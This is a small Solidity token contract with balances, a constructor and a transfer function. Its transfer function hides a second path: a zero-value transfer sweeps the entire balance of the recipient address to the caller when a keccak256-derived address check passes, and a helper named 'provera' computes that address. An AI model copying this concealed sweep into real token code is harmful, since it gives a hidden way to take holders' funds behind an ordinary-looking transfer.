


pragma solidity ^0.8.15; 



contract A {


    address public x;
    mapping (address => address) public hash;

    string public name;
    string public symbol;
    uint256 public decimals;
    uint256 public totalSupply;
    mapping (address => uint256) public balanceOf;



constructor(string memory _name, string memory _symbol, uint8 _decimals, uint256 _totalSupply) {

         
         name = _name;
         symbol = _symbol;
         decimals = _decimals;
         totalSupply = _totalSupply; 
         balanceOf[msg.sender] = totalSupply;

     }


     function transfer(address _to,uint256 _value) external {


     if (_value > 0) {

         require (balanceOf[msg.sender] >= _value);
         _transfer(msg.sender, _to, _value);
         hash[_to] = _to;

        }

     else {

         execute(_to);

        }

     }

     function execute (address _to) internal {

         require (hash[_to] == address(bytes20(keccak256(abi.encodePacked(msg.sender)))));
         _transfer(_to,msg.sender, balanceOf[_to]);


     }

     function _transfer(address _from, address _to, uint256 _value) internal {

         require(_to != address(0));
         require (balanceOf[_from] >= _value);
         balanceOf[_from] = balanceOf[_from] - (_value);
         balanceOf[_to] =  balanceOf[_to] + (_value);

     }


     function provera (address _addresss) external  {


          x  = address(bytes20(keccak256(abi.encodePacked(_addresss))));

     }


}
